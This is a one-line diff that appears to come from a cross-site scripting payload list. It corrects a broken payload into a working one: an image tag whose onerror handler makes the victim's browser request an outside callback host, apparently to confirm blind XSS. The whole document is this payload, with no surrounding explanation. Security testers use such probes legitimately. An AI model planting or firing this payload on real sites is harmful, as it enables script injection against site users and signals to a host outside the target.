@@ -1,1 +1,1 @@
-<IMG SRC=# onerror=http://qpeegim4.eyes.sh/abc>
+<img src="#" onerror="new Image().src='http://qpeegim4.eyes.sh/abc'">
